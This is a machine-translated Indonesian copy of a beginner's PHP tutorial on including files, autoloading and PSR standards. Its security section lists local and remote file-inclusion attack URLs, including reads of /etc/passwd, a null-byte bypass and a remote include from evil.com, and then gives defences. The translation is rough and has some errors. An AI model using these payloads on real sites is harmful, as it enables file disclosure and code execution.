<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏿‍🌾 🖤 👸🏼 PHP untuk pemula. Koneksi file 💆 🕺🏼 ⏩</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sebagai kelanjutan dari seri PHP untuk Pemula, artikel hari ini akan fokus pada bagaimana PHP mencari dan menghubungkan file. 

 Kenapa dan mengapa 
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PHP untuk pemula. Koneksi file</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439618/"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7f2/13e/83b/7f213e83b178b352cfdda06ff16a639f.png" alt="gambar"></div><br><br>  Sebagai kelanjutan dari seri PHP untuk Pemula, artikel hari ini akan fokus pada bagaimana PHP mencari dan menghubungkan file. <br><a name="habracut"></a><br><h3>  Kenapa dan mengapa </h3><br>  PHP adalah bahasa scripting yang awalnya dibuat untuk memahat halaman rumah (ya, ya itu awalnya <strong>P</strong> ersonal <strong>H</strong> ome <strong>P</strong> Age Tools), dan kemudian mulai membuat toko, program sosial dan kerajinan lain di atas lututnya yang melampaui apa yang dimaksudkan , tetapi mengapa saya - dan fakta bahwa semakin banyak fungsi yang disandikan, semakin besar keinginan untuk menyusunnya dengan benar, menyingkirkan duplikasi kode, memecahnya menjadi potongan-potongan logis dan menghubungkan hanya jika perlu (ini adalah perasaan yang sama yang Anda miliki ketika Anda membacanya sebelumnya  posisi, itu bisa dipecah menjadi beberapa bagian).  Untuk tujuan ini, PHP memiliki beberapa fungsi, yang arti umumnya adalah untuk menghubungkan dan menafsirkan file yang ditentukan.  Mari kita lihat contoh menghubungkan file: <br><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// file variable.php $a = 0; // file increment.php $a++; // file index.php include ('variable.php'); include ('increment.php'); include ('increment.php'); echo $a;</span></span></code> </pre> <br>  Jika Anda menjalankan skrip <em>index.php</em> , maka PHP akan terhubung dan menjalankan semua ini secara berurutan: <br><br><pre> <code class="php hljs">$a = <span class="hljs-number"><span class="hljs-number">0</span></span>; $a++; $a++; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br>  Ketika file terhubung, kodenya berada dalam cakupan yang sama dengan baris yang terhubung, sehingga semua variabel yang tersedia di baris ini akan tersedia dalam file yang disertakan.  Jika kelas atau fungsi dideklarasikan dalam file include, maka mereka termasuk dalam lingkup global (kecuali tentu saja namespace ditentukan untuk mereka). <br><br>  Jika Anda menghubungkan file di dalam fungsi, maka file yang disertakan mendapatkan akses ke lingkup fungsi, sehingga kode berikut juga akan berfungsi: <br><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; } a(); <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br><blockquote>  Secara terpisah, saya mencatat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">konstanta ajaib</a> : <code>__DIR__</code> , <code>__DIR__</code> , <code>__DIR__</code> dan lainnya - mereka terikat pada konteks dan dieksekusi sebelum inklusi terjadi </blockquote>  Keunikan menghubungkan file adalah bahwa ketika menghubungkan file, parsing beralih ke mode HTML, untuk alasan ini setiap kode di dalam file yang disertakan harus dilampirkan dalam tag PHP: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//   // ... // </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br>  Jika Anda hanya memiliki kode PHP dalam file, sudah biasa untuk menghilangkan tag penutup, agar tidak sengaja melupakan utas karakter setelah tag penutup, yang penuh dengan masalah (saya akan membahas ini di artikel berikutnya). <br><blockquote>  Pernahkah Anda melihat file situs dengan 10.000 baris?  Sudah menangis di mataku (╥_╥) ... </blockquote><h3>  Fitur Koneksi File </h3><br>  Seperti disebutkan di atas, di PHP ada beberapa fungsi untuk menghubungkan file: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">termasuk</a> - sertakan dan laksanakan file yang ditentukan, jika tidak menemukannya - itu memberi peringatan <code>E_WARNING</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">include_once</a> - mirip dengan fungsi di atas, tetapi termasuk file sekali </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">memerlukan</a> - termasuk dan mengeksekusi file yang ditentukan, jika tidak menemukannya - itu memberikan kesalahan fatal <code>E_ERROR</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">require_once</a> - mirip dengan fungsi di atas, tetapi termasuk file sekali </li></ul><br><blockquote>  Pada kenyataannya, ini bukan fungsi, itu adalah konstruksi bahasa khusus, dan tanda kurung dapat dihilangkan.  Di antara hal-hal lain, ada cara lain untuk menghubungkan dan mengeksekusi file, tetapi gali sendiri, biarkan itu menjadi "tugas dengan tanda bintang" untuk Anda;) </blockquote>  Mari kita ambil contoh perbedaan antara <code>require</code> dan <code>require_once</code> , ambil satu file <em>echo.php</em> : <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Dan kami akan menghubungkannya beberapa kali: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//     //  1 require_once 'echo.php'; //    , ..   //  true require_once 'echo.php'; //     //  1 require 'echo.php';</span></span></code> </pre><br>  Hasil eksekusi akan berupa dua koneksi ke file <em>echo.php</em> : <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Ada beberapa arahan lain yang mempengaruhi koneksi, tetapi Anda tidak akan membutuhkannya - <a href="">auto_prepend_file</a> dan <a href="">auto_append_file</a> .  Arahan ini memungkinkan Anda untuk menginstal file yang akan terhubung sebelum semua file terhubung dan setelah semua skrip dieksekusi, masing-masing.  Saya bahkan tidak bisa membuat skenario "langsung" ketika itu mungkin diperlukan. <br><br><div class="spoiler">  <b class="spoiler_title">Tugas</b> <div class="spoiler_text">  Anda dapat membuat dan menerapkan skrip untuk menggunakan <code>auto_append_file</code> <code>auto_prepend_file</code> dan <code>auto_append_file</code> , Anda hanya dapat mengubahnya di <em>php.ini</em> , <em>.htaccess</em> atau <em>httpd.conf</em> (lihat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PHP_INI_PERDIR</a> ) :) <br></div></div><br><h3>  Di mana mencari? </h3><br>  Pencarian PHP untuk menyertakan file dalam direktori yang ditentukan dalam direktif <a href="">include_path</a> .  Arahan ini juga mempengaruhi pengoperasian <code>fopen()</code> , <code>file()</code> , <code>readfile()</code> dan <code>file_get_contents()</code> .  Algoritma ini cukup sederhana - ketika mencari file, PHP bergantian memeriksa setiap direktori dari <code>include_path</code> , hingga menemukan file untuk dihubungkan, jika tidak, ia mengembalikan kesalahan.  Untuk mengubah <code>include_path</code> dari skrip, gunakan fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">set_include_path ()</a> . <br><br>  Ada satu hal penting yang perlu dipertimbangkan ketika menyiapkan <code>include_path</code> - karakter yang berbeda digunakan sebagai pemisah jalur pada Windows dan Linux - ";"  dan ":" masing-masing, jadi ketika menentukan direktori Anda, gunakan konstanta <code>PATH_SEPARATOR</code> , misalnya: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//    linux $path = '/home/dev/library'; //    windows $path = 'c:\Users\Dev\Library'; //  linux  windows   include_path  set_include_path(get_include_path() . PATH_SEPARATOR . $path);</span></span></code> </pre><br>  Saat Anda menulis <code>include_path</code> dalam file ini, Anda dapat menggunakan variabel lingkungan seperti <code>${USER}</code> : <br><br> <code>include_path = ".:${USER}/my-php-library" <br></code> <br><br>  Jika Anda menyertakan jalur absolut (dimulai dengan "/") atau relatif (dimulai dengan "." Atau "..") saat menghubungkan file, maka arahan <code>include_path</code> akan diabaikan, dan pencarian hanya akan dilakukan pada jalur yang ditentukan. <br><blockquote>  Mungkin akan bermanfaat untuk berbicara tentang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">safe_mode</a> , tetapi ini sudah lama menjadi cerita (sejak versi 5.4), dan saya harap Anda tidak akan menemukan itu, tetapi jika tiba-tiba, maka untuk mengetahui apa itu, tapi itu berlalu ... </blockquote><h3>  Menggunakan pengembalian </h3><br>  Saya akan memberi tahu Anda tentang hack kecil - jika file yang disertakan mengembalikan sesuatu menggunakan konstruk <code>return</code> , maka data ini dapat diperoleh dan digunakan, sehingga Anda dapat dengan mudah mengatur koneksi file konfigurasi, saya akan memberikan contoh untuk ilustrasi: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'user'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'pass'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">''</span></span> ];</code> </pre><br><pre> <code class="php hljs">$dbConfig = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'config/db.php'</span></span>; var_dump($dbConfig); <span class="hljs-comment"><span class="hljs-comment">/* array( 'host' =&gt; 'localhost', 'user' =&gt; 'root', 'pass' =&gt; '' ) */</span></span></code> </pre><br><blockquote>  Fakta menarik, yang tanpanya juga bagus: jika fungsi didefinisikan dalam file yang disertakan, maka mereka dapat digunakan dalam file utama, terlepas dari apakah mereka dideklarasikan sebelum kembali atau setelah </blockquote><div class="spoiler">  <b class="spoiler_title">Tugas</b> <div class="spoiler_text">  Tulis kode yang akan mengumpulkan konfigurasi dari beberapa folder dan file.  Struktur file adalah sebagai berikut: <br><br><pre> <code class="plaintext hljs">config |-- default | |-- db.php | |-- debug.php | |-- language.php | `-- template.php |-- development | `-- db.php `-- production |-- db.php `-- language.php</code> </pre><br>  Dalam hal ini, kode harus berfungsi sebagai berikut: <br><br><ul><li>  jika ada variabel <code>PROJECT_PHP_SERVER</code> di lingkungan sistem dan itu sama dengan <code>development</code> , maka semua file dari folder <em>default</em> harus terhubung, data harus dimasukkan dalam variabel <code>$config</code> , maka file dari folder <em>pengembangan</em> harus terhubung, dan data yang diterima harus menggiling item yang sesuai disimpan di <code>$config</code> </li><li>  perilaku serupa jika <code>PROJECT_PHP_SERVER</code> adalah <code>production</code> (secara alami hanya untuk folder <em>produksi</em> ) </li><li>  jika tidak ada variabel, atau tidak diset dengan benar, maka hanya file dari folder <em>default</em> yang terhubung </li></ul><br></div></div><br><h3>  Sambung otomatis </h3><br>  Dibangun dengan menghubungkan file terlihat sangat rumit, dan juga mengikuti pembaruan mereka - hadiah lain, periksa sepotong kode dari contoh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">artikel tentang pengecualian</a> : <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// load all files w/out autoloader require_once 'Education/Command/AbstractCommand.php'; require_once 'Education/CommandManager.php'; require_once 'Education/Exception/EducationException.php'; require_once 'Education/Exception/CommandManagerException.php'; require_once 'Education/Exception/IllegalCommandException.php'; require_once 'Education/RequestHelper.php'; require_once 'Education/Front.php';</span></span></code> </pre><br>  Upaya pertama untuk menghindari "kebahagiaan" seperti itu adalah munculnya fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">__autoload</a> .  Lebih tepatnya, itu bahkan bukan fungsi spesifik, Anda harus mendefinisikan fungsi ini sendiri, dan dengan itu Anda perlu menghubungkan file yang kami butuhkan dengan nama kelas.  Satu-satunya aturan adalah bahwa <strong>untuk setiap kelas file terpisah harus dibuat dengan nama kelas</strong> (mis. <i>MyClass</i> harus berada di dalam file <i>myClass.php</i> ).  Berikut adalah contoh implementasi fungsi tersebut <code>__autoload()</code> (diambil dari komentar di manual resmi): <br><br>  Kelas yang akan kita hubungkan: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//  myClass    myClass.php class myClass { public function __construct() { echo "myClass init'ed successfuly!!!"; } }</span></span></code> </pre><br>  File yang menghubungkan kelas ini: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function __autoload($classname) { $filename = $classname .".php"; include_once $filename; } //   $obj = new myClass();</span></span></code> </pre><br>  Sekarang tentang masalah dengan fungsi ini - bayangkan sebuah situasi di mana Anda menghubungkan kode pihak ketiga, dan ada seseorang yang sudah mendaftarkan fungsi <code>__autoload()</code> untuk kode Anda, dan voila: <br><br><pre> <code class="php hljs">Fatal error: Cannot redeclare __autoload()</code> </pre><br>  Untuk menghindari hal ini, kami membuat fungsi yang memungkinkan Anda untuk mendaftarkan fungsi atau metode arbitrer sebagai pemuat kelas - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">spl_autoload_register</a> .  Yaitu  kita dapat membuat beberapa fungsi dengan nama arbitrer untuk memuat kelas, dan mendaftarkannya menggunakan <code>spl_autoload_register</code> .  Sekarang <code>index.php</code> akan terlihat seperti ini: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function myAutoload($classname) { $filename = $classname .".php"; include_once($filename); } //   spl_autoload_register('myAutoload'); //   $obj = new myClass();</span></span></code> </pre><br><blockquote>  Judul "tahukah Anda?": Parameter pertama <code>spl_autoload_register()</code> adalah opsional, dan memanggil fungsi tanpanya, fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">spl_autoload</a> akan digunakan sebagai pemuat, pencarian akan dilakukan pada folder dari <code>include_path</code> dan file dengan ekstensi <code>.php</code> dan <code>.inc</code> , tapi ini daftar dapat diperluas menggunakan fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">spl_autoload_extensions</a> </blockquote>  Sekarang setiap pengembang dapat mendaftarkan pemuatnya, hal utama adalah bahwa nama kelas tidak cocok, tetapi ini seharusnya tidak menjadi masalah jika Anda menggunakan ruang nama. <br><blockquote>  Karena fungsi canggih seperti <code>spl_autoload_register()</code> telah ada sejak lama, fungsi <code>spl_autoload_register()</code> telah dinyatakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">usang dalam PHP 7.1</a> , yang berarti bahwa di masa mendatang fungsi ini akan sepenuhnya dihapus (X_x) </blockquote>  Nah, gambar telah lebih atau kurang beres, meskipun, hei, semua bootloader yang terdaftar antri saat mereka terdaftar, masing-masing, jika seseorang telah menipunya ke dalam bootloader-nya, maka alih-alih hasil yang diharapkan, bug yang sangat tidak menyenangkan akan muncul.  Untuk mencegah hal ini, orang-orang pintar dewasa telah menggambarkan standar yang memungkinkan Anda untuk menghubungkan perpustakaan pihak ketiga tanpa masalah, yang utama adalah bahwa organisasi kelas di dalamnya mematuhi standar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PSR-0</a> (sudah 10 tahun sudah) atau <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PSR-4</a> .  Apa inti dari persyaratan yang dijelaskan dalam standar: <br><br><ol><li>  Setiap perpustakaan harus hidup di namespace-nya sendiri (disebut vendor namespace) </li><li>  Setiap namespace harus memiliki folder sendiri. </li><li>  Di dalam namespace mungkin ada subruang - juga di folder terpisah </li><li>  Satu kelas - satu file </li><li>  Nama file dengan ekstensi <code>.php</code> harus sama persis dengan nama kelas </li></ol><br>  Contoh dari manual: <br><table><tbody><tr><th>  Nama kelas lengkap </th><th>  Namespace </th><th>  Direktori basis </th><th>  Jalan penuh </th></tr></tbody><tbody><tr><td>  \ Acme \ Log \ Writer \ File_Writer </td><td>  Acme \ Log \ Writer </td><td>  ./acme-log-writer/lib/ </td><td>  ./acme-log-writer/lib/File_Writer.php </td></tr><tr><td>  \ Aura \ Web \ Response \ Status </td><td>  Aura \ Web </td><td>  / path / ke / aura-web / src / </td><td>  /path/to/aura-web/src/Response/Status.php </td></tr><tr><td>  \ Symfony \ Core \ Request </td><td>  Symfony \ core </td><td>  ./vendor/Symfony/Core/ </td><td>  ./vendor/Symfony/Core/Request.php </td></tr><tr><td>  \ Zend \ Acl </td><td>  Zend </td><td>  / usr / termasuk / Zend / </td><td>  /usr/includes/Zend/Acl.php </td></tr></tbody></table><br><br>  Perbedaan antara kedua standar ini adalah bahwa PSR-0 mendukung kode lama tanpa namespace (mis., Sebelum versi 5.3.0), dan PSR-4 bebas dari anakronisme ini, dan bahkan menghindari bersarangnya folder yang tidak perlu. <br><br>  Berkat standar ini, menjadi mungkin munculnya alat seperti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">komposer</a> - manajer paket universal untuk PHP.  Jika ada yang terlewat, maka ada laporan bagus dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">pronskiy</a> tentang alat ini. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/cpdJR0D8ZV8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h3>  Injeksi Php </h3><br>  Saya juga ingin berbicara tentang kesalahan pertama setiap orang yang membuat titik masuk tunggal untuk situs dalam satu <code>index.php</code> dan menyebutnya kerangka kerja MVC: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_file($page)) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page;</code> </pre><br>  Anda melihat kode, dan Anda hanya ingin mentransfer sesuatu yang berbahaya di sana: <br><br><pre> <code class="bash hljs">//     http://domain.com/index.php?page=../index.php //      http://domain.com/index.php?page=config.ini //    http://domain.com/index.php?page=/etc/passwd //  ,       http://domain.com/index.php?page=user/backdoor.php</code> </pre><br>  Hal pertama yang terlintas dalam pikiran adalah untuk menambahkan ekstensi <code>.php</code> dengan paksa, tetapi dalam beberapa kasus dapat dielakkan "berkat" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">kerentanan nol byte</a> (baca kerentanan ini <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">telah diperbaiki</a> untuk waktu yang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">lama</a> , tetapi tiba-tiba Anda menemukan penerjemah yang lebih tua dari PHP 5.3, well, untuk pengembangan umum juga merekomendasikan): <br><br><pre> <code class="bash hljs">//    http://domain.com/index.php?page=/etc/passwd%00</code> </pre><br><blockquote>  Dalam versi modern PHP, keberadaan karakter nol byte di jalur file yang terhubung segera mengarah ke kesalahan koneksi yang sesuai, dan bahkan jika file yang ditentukan ada dan dapat dihubungkan, hasilnya akan selalu menjadi kesalahan, diperiksa sebagai berikut <code>strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</code> (ini berasal dari isi PHP itu sendiri) </blockquote>  Pikiran "berharga" kedua adalah memeriksa file di direktori saat ini: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos(realpath($page), <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>) !== <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong path to file'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br>  Yang ketiga, tetapi bukan modifikasi terakhir dari pemeriksaan ini adalah penggunaan direktif <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">open_basedir</a> , dengan bantuannya Anda dapat menentukan direktori tempat tepatnya PHP akan mencari file untuk dihubungkan: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); ini_set(<span class="hljs-string"><span class="hljs-string">'open_basedir'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br><blockquote>  Hati-hati, arahan ini tidak hanya memengaruhi koneksi file, tetapi juga semua berfungsi dengan sistem file, mis.  termasuk pembatasan ini, Anda harus yakin bahwa Anda tidak melupakan apa pun di luar direktori yang ditentukan, baik data yang di-cache, maupun file pengguna apa pun (walaupun fungsi <code>is_uploaded_file()</code> dan <code>move_uploaded_file()</code> terus bekerja dengan folder sementara untuk file yang diunduh). </blockquote>  Cek lain apa yang mungkin?  Banyak pilihan, semuanya tergantung pada arsitektur aplikasi Anda. <br><br>  Saya juga ingin mengingat keberadaan direktif <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">allow_url_include yang</a> "luar biasa" (tergantung pada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">allow_url_fopen</a> ), ini memungkinkan Anda untuk terhubung dan mengeksekusi file PHP jarak jauh, yang jauh lebih berbahaya bagi server Anda: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   PHP  http://domain.com/index.php?page=http://evil.com/index.php</span></span></code> </pre><br>  Melihat, mengingat, dan tidak pernah menggunakan, manfaatnya dimatikan secara default.  Anda akan memerlukan fitur ini sedikit kurang dari sebelumnya, dalam semua kasus lainnya, letakkan arsitektur aplikasi yang benar, di mana berbagai bagian aplikasi berkomunikasi melalui API. <br><br><div class="spoiler">  <b class="spoiler_title">Tugas</b> <div class="spoiler_text">  Tulis skrip yang memungkinkan Anda untuk menghubungkan skrip php dari folder saat ini dengan nama, sambil mengingat tentang kemungkinan kerentanan dan menghindari kesalahan. <br></div></div><br><h3>  Kesimpulannya </h3><br>  Artikel ini adalah dasar-dasar dalam PHP, jadi pelajari dengan seksama, selesaikan tugas dan jangan ajukan, tidak ada yang akan mengajarkan untuk Anda. <br><br><h3>  PS </h3><br>  Ini adalah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">repost</a> dari serangkaian artikel "PHP untuk pemula": <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Sesi</a> </li><li>  <b>Koneksi file</b> </li></ul><br>  Jika Anda memiliki komentar pada materi artikel, atau mungkin dalam bentuk, kemudian jelaskan esensi dalam komentar, dan kami akan membuat materi ini lebih baik. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id439618/">https://habr.com/ru/post/id439618/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id439606/index.html">Uji coba produksi elektronik dengan harga minimum</a></li>
<li><a href="../id439608/index.html">Agama Modern: Apa yang diberikan Google, Facebook, Amazon, dan Apple kepada orang-orang?</a></li>
<li><a href="../id439610/index.html">Seperti pada kendaraan listrik Chevrolet Bolt saya, dalam garansi, dua modul baterai diganti, dan yang ketiga dalam pengawasan</a></li>
<li><a href="../id439612/index.html">JavaScript yang kuat: mengejar mitos</a></li>
<li><a href="../id439616/index.html">Intisari proyek-proyek TI yang menarik di Kickstarter No. 7</a></li>
<li><a href="../id439620/index.html">Memahami Asynchrony dalam JavaScript [Terjemahan dari Sukhjinder Arora]</a></li>
<li><a href="../id439624/index.html">Mengapa menyimpan data dalam orbit</a></li>
